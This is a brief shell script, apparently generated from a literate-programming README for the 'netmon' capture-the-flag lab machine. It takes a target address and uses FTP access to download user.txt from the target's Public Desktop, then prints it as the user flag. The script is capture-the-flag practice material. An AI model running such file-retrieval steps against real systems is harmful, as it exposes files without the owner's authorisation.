# ~/~ begin <<netmon/README.md#netmon.sh>>[init]
TARGET_URL="$1"
ATTACK_URL="$2"
# ~/~ end
# ~/~ begin <<netmon/README.md#netmon.sh>>[1]
rm /tmp/user.txt 2>/dev/null
ftp "ftp://${TARGET_URL}/Users/Public/Desktop/user.txt" -o /tmp/user.txt || exit
printf "\nUser flag is: "
cat /tmp/user.txt
# ~/~ end
